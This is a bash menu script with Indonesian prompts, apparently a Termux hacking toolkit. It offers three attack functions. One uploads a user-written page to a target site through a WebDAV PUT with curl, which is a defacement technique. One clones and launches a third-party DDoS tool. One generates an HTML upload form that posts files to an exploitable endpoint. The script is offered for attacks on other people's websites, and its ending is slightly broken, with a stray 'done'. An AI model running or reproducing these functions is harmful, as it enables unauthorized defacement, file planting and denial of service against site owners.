#!/usr/bin/bash
# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'
figlet INYOURKZY| lolcat
echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% $green" | lolcat
echo "%                %        %               % $green" | lolcat
echo "%        ∆       %        %        ∆      % $green" | lolcat
echo "%                %        %               % $green" | lolcat
echo "%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%%% $green" | lolcat
echo ""
echo "                      / $green" |lolcat
echo "                     / $green" | lolcat
echo "                    / $green" |lolcat
echo "                   --- $green" | lolcat
echo ""
echo "            \_-_-_-_-_-_-_-_-_-/ $green" | lolcat

lagi=1
while [ $lagi -lt 4 ];
do

echo ""
echo -e "<============================>" | lolcat
echo -e $b "1. Webdav${enda}";
echo -e "<============================>" | lolcat
echo -e $b "2. DDOS${endcla}";
echo -e "<============================>" | lolcat
echo -e $b "3. Script CSRF${enda}";
echo -e "<============================>" | lolcat
echo -e $b "4. Keluar${enda}";
echo -e "<============================>" | lolcat
echo -e "silahkan pilih" | lolcat
read -p "YANG diatas ^_^ =>" pil;

# Webdav
case $pil in
1) echo "===== Tulis nama sc lu =====" | lolcat
sleep 2
read nama
echo "===== Copas text sc ======" | lolcat
sleep 2
echo "===== kalo sudah tercopas tekan :wq =====" | lolcat 
echo "===== exsistensi contoh : .html .txt =====>" | lolcat
read script
vim $nama$script
sleep 3
echo "=====Masukin link ====> "
read target
curl -T $script $target
echo "liat $target$script" | lolcat

;;

2) git clone https://github.com/chit0/kubucy.git
pkg install python
pkg install pip2
pip install termcolor
pip install colored
pip install requests
echo -e "cd Kubucy"
echo -e "python2 Kubucy.py"
cd /data/data/com.termux/files/home/Kubucy/
python2 /data/data/com.termux/files/home/Kubucy/Kubucy.py
echo

;;

3)echo "===== Judul sc lu =====" | lolcat
read nama
sleep 2
echo "===== Nama SC ======" | lolcat
read n
sleep 2
echo "===== warna font =====" | lolcat
read w
sleep 2
echo "===== background =====" | lolcat
read ww
sleep 2
echo "===== link gambar  =====" | lolcat 
read l
sleep 2
echo "===== link n exploit =====" | lolcat
read so
sleep 2
echo "===== autho By ?  =====" | lolcat
read f
sleep 2
echo "===== sedang memproses ....." | lolcat
sleep 5
echo "=========>>>> silahkan copas <<<<=========
<title>$nama</title>
<center>
<h1>$n</h1>
<br>
	<img src="$l" width= "150" height= "150"/>
	<body style="color: $w ; background-color:$ww ;">
<h2>CSRF</h2>
<marquee loop="100" direction="left"><b>_______________________________________</b></marquee>
<marquee loop="100" direction="right"><b>_______________________________________</b></marquee>
<br>
<br>
<br>
	<form method="POST" action="$so" enctype="multipart/form-data"> 
	
<input type="file" name="file"><button>Unggah</button>
</form>
</font>
</center>
<br><br>
<font size="5" color="red">
<b><u>Author</u></b>
</font>
<br>
<font size="4" color="$w">
 => $f
	</font>           
<=== silahkan dicopy sampe sini ===>"


;;

4) echo "Thanks telah menggunakan tools saya" | lolcat
exit

;;

esac
done
done
